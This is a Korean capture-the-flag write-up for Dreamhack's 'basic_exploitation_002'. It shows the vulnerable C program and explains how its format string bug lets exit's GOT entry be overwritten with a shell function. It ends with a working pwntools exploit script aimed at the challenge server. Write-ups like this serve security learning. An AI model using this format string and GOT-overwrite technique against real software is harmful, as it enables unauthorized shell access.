# basic_exploitation_002

주어진 파일의 소스코드는 다음과 같다.   

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```   
소스코드를 보면 main함수 printf(buf); 부분에서 FSB가 발생할 수 있다.   
따라서 FSB를 이용하여 exit함수의 got를 get_shell함수의 plt로 덮어주면 shell을 획득할 수 있다.   
<br/>

gdb에서 다음과 같이 exit함수의 got를 get_shell함수의 plt를 구할 수 있다.
image   

해당 주소들을 얻었으면 입력 값을 몇 번째 서식 문자열에서 참조하는 확인해봐야 한다.
image   


입력하고 바로 첫 번째 서식 문자에서 참조되는 것을 알 수 있다.   

이를 참조하여 페이로드를 구성하면 ```(exit_got) + (exit_got+2) + %2044c + %2$n + %32261c + %1$n```이다.

```
from pwn import *

exit_got = 0x804a024
#get_shell_plt = 0x804860a

p = remote("host1.dreamhack.games", 12316)

payload = p32(exit_got) + p32(exit_got+2) + "%2044c%2$hn%32261c%1$hn"

p.send(payload)
p.interactive()
```
